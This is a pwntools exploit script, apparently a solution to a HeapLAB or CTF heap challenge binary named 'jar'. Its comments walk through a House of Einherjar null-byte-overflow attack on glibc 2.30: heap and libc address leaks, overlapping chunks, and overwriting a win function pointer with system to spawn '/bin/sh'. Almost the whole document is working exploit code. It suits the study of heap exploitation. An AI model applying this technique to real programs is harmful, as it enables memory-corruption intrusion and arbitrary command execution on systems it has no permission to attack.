from pwn import *

elf = context.binary = ELF("./jar")
libc = ELF("/home/kali/Desktop/HeapLAB/.glibc/glibc_2.30/libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="disasm", size="35%")
    .above(of="disasm", display="stack")
    .above(of="stack", display="regs")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug("./jar", gdbscript=gs, env={"LD_LIBRARY_PATH": "/home/kali/Desktop/HeapLAB/.glibc/glibc_2.30/"})
    else:
        return process("./jar", env={"LD_LIBRARY_PATH": "/home/kali/Desktop/HeapLAB/.glibc/glibc_2.30/"})


curr_jar = 0


def add_jar(contents):
    global curr_jar

    io.sendline("1") 
    io.sendlineafter(": ",contents)

    io.recvuntil("Choice: ")

    curr_jar += 1
    return curr_jar - 1


def set_answer(jar):
    io.sendline("6")
    io.sendlineafter("win?", f"{jar}")

    io.recvuntil("Answer: ")
    answer_str = io.recvline()

    answer = int(answer_str.split(b" ")[0][2:-4], base=16)

    io.recvuntil("Choice: ")

    return answer


def get_jars():
    io.sendline("3")

    jars = io.recvuntil("Main Menu:\n")[:-11] # Trim off the "Main Menu"
    io.clean()

    jars = jars.split(b"Jar Contents: ")

    return jars


def remove_jar(jar):
    io.sendline("2")
    io.sendline(f"{jar}")

    io.clean()


def modify_jar(jar, contents):
    io.sendline("4")
    io.sendlineafter("Which Jar? \n", f"{jar}")
    io.sendlineafter("Jar Contents: \n", contents)

    io.clean()


def set_format_string(fmt_str):
    io.sendline("F"*32 + fmt_str)
    io.clean()


def play_game(answer):
    io.sendline("5")
    io.clean()
    io.sendline(f"{answer}")

io = start()

# The idea here is to use a House of Einherjar (?) primitive to consolidate backwards to a fake chunk, creating overlapping
# allocations. This allows us, with some careful arranging, to place a chunk that is linked into the unsorted bin directly
# over a chunk for a jar we can read, leaking libc. We then allocate a new answer struct, and using the same jar as before
# overwrite the win function pointer to system, and the right answer jar to one containing "/bin/sh" we allocated earlier.
# Playing the game and winning will actually end up calling system("/bin/sh")

# This is the jar (a R/W 0x100 size chunk) that will hold the fake chunk we consolidate back to. In order to create it though,
# we need the address of the heap.
jar_0 = add_jar("zero")

# Thankfully, the binary kindly leaks it for us whenever we set an answer. Each call to set the answer creates an 0x110 sized
# chunk on the heap, holding a pointer to a function to call when someone wins and a pointer to the correct jar (chunk)
answer_addr = set_answer(jar_0)
heap_addr = answer_addr - 0x3a0
print(f"HEAP: {hex(heap_addr)}")

# This second one is padding. Because printf stops on nulls (and the malloc size field here will contain nulls) in order to
# leak libc we need to perfectly overlap the beginning of two chunks, that way when we read out the contents of the jar the 
# first character is the LSB of the address. This 0x110 chunk (combined with the one above) allows us to fix the 0x200 offset
# the consolidated chunk has
set_answer(jar_0)

# Set up the fake chunk. This also needs creates a fake target for the chunks fd and bk pointers to pass safe unlinking checks.
# Because the final size of the consolidated chunk ends up being largebin size (0x500), we also clear out the fd_nextsize and
# bk_nextsize pointers so we don't break things when unlinking
fake_chunk_size = 0x400
fake_chunk_addr = heap_addr + 0x2b0
modify_jar(jar_0, flat({
    0x18: p64(fake_chunk_size) + p64(fake_chunk_addr + 0x20) + p64(fake_chunk_addr + 0x28) + p64(0) + p64(0),
    0x48: p64(fake_chunk_addr)
}))

# Allocation two more jars. Jar 1 is used to overwrite the prev_in_use flag of jar 2, as well as set a fake prev_size to cause
# a backwards consolidation with our fake chunk. Jar 2 will be freed to trigger the House of Einherjar primitive
jar_1 = add_jar("one")
jar_2 = add_jar("two")

# Overwrite prve_size_field, use null byte overflow to clear the prev_in_use flag of jar 2
modify_jar(jar_1, flat({
    0xf0: fake_chunk_size
}))

# Allocate and free enough jars so that when we free jar 2 it gets placed into the unsorted bin. This is important because
# chunks in the tcache are not considered for consolidation attempts
temp_jars = []
for x in range(5):
    temp_jars.append(add_jar(f"{x}"))
for j in temp_jars:
    remove_jar(j)

remove_jar(jar_0)
remove_jar(jar_1)

# This triggers the consolidation with the fake chunk we created earlier. We end up with an 0x500 sized chunk in the unsorted
# bin
remove_jar(jar_2)

# Re allocate jar 1. This is the chunk that we will end up reading the address of the unsorted bin (and therefore lics) from
libc_jar = add_jar("libc")

# The win function pointer gets passed a pointer to the jar's contents. We add a jar with that string, so that way when we
# overwrite the function pointer to system it gets called with the desired command. This ends up being jar 0, and we know
# it's offset from the beginning of the heap
binsh_jar = add_jar("/bin/sh\0")
binsh_jar_addr = heap_addr + 0x2a0

# Allocate enough jars to clear out the tcache, as well as 3 that get remaindered off the 0x500 chunk in the unsorted bin.
# This places the next chunk overlapping perfectly with libc_jar
for x in range(8):
    add_jar(f"{x}{x}")

# Parse out the address and calculate the offset
jar_contents = get_jars()
unsorted_bin_address = u64(jar_contents[libc_jar + 1].ljust(8, b"\0"))
main_arena_address = unsorted_bin_address - 96
libc.address = main_arena_address - libc.sym.main_arena 
print(f"LIBC: {hex(libc.address)}")

# Allocate a new answer struct. This has the same address of the libc_jar, allowing us the overwrite it's fields
set_answer(binsh_jar)

# Overwrite the win function with system. Note we also have to overwrite the correct answer, since other wise the null
# terminator would clobber it
modify_jar(libc_jar, p64(libc.sym.system) + p64(binsh_jar_addr))

# Play the game with the correct choice, causing with the win function to be called with the contets of the jar, which in this
# case is system("/bin/sh")
play_game(binsh_jar)

io.interactive()

